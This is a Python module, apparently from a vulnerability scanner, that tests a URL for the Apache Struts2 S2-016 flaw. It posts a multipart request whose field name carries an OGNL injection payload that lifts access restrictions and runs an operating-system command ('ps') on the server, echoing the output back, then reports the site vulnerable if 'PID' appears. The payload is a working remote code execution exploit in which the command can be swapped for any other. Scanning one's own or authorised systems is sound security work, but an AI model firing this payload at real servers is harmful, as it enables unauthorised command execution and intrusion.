# -*- encoding: utf-8 -*-
'''
@File : s2_016_2.py
@Time : 2019/08/03 22:02:06
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import requests
from lib import *
import sys

def s2_016_2(url):
    headers = {
            "Accept-Encoding": "gzip, deflate",
            "Connection": " Keep-Alive",
            "Cookie": "",
            "Content-Type": "multipart/form-data; boundary=------------------------4a606c052a893987",
        }
    exp = '''--------------------------4a606c052a893987\r\nContent-Disposition: form-data; name="method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&cmd=ps&pp=\\A&ppp= &encoding=UTF-8"\r\n\r\n-1\r\n--------------------------4a606c052a893987--'''
    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "PID" in resp.text:
            print(Vcolors.RED +"存在S2-016漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-016_multipart_formdata__special漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-016_multipart_formdata__special漏洞~"+ Vcolors.ENDC)